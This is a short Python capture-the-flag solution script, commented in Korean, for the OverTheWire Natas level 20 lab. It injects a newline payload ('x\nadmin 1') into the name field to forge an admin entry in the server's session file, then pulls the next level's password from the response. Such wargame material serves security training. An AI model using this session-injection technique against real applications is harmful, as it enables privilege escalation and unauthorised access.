import requests
import string
import re


url = "http://natas20.natas.labs.overthewire.org/index.php"
#natas20 비밀번호 아래 변수에 대입 
natas20_cred = ""

s = requests.Session()
s.auth = ("natas20", natas20_cred)

boundary = "=" * 60

# 페이로드는 개행을 넣어서 admin 1이라는 값으로 세션을 조작해야함
payload = "x\nadmin 1"

# post요청을 하면 저 페이로드를 넣고 파일을 저장하고 get 요청을 하면 파일을 읽어옴
data = {"name": payload, "submit": "Change name"}
file_put_response = s.post(url, data=data)
file_get_response = s.get(url)  

# 비밀번호 정규식을 통한 출력
password = re.search(r"Password:\s*(\w+)",file_get_response.text)

# 비밀번호값만 출력 및 예외처리
if password:
  print(boundary)  
  print(f"[+]natas21의 비밀번호 ====> {password.group(1)}")
  print(boundary)
else:
  print(boundary)  
  print(f"[-]일치하는 문장을 찾지 못했으니 아래 응답 전체를 보고 확인하세요")
  print(file_get_response.text)
  print(boundary)    
